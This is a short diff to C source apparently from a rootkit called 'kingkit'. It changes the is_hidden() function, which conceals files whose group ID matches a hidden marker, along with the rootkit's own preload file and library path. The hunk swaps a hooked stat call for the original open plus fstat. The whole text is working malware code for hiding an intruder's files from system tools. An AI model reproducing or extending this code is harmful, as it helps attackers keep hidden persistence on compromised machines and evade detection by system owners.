@@ -299,12 +299,15 @@ int is_hidden(char *pathname) {
     #if DEBUG
     printf("[kingkit] is_hidden() called with pathname: %s.\n", pathname);
     #endif
-    original_stat = syscall_address(original_stat, "stat");
+    original_open = syscall_address(original_open, "open");
+    int fd = (*original_open)(pathname, O_RDONLY);
     struct stat sb;
-    if ((*original_stat)(pathname, &sb) != -1 && sb.st_gid == HIDDEN_GID) {
-        return 1;
+    if (fstat(fd, &sb) == -1) {
+        close(fd);
+        return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0;
     }
-    return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0; //return 1 if there is a match
+    close(fd);
+    return sb.st_gid == HIDDEN_GID || strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0; //return 1 if there is a match
 }
 
 
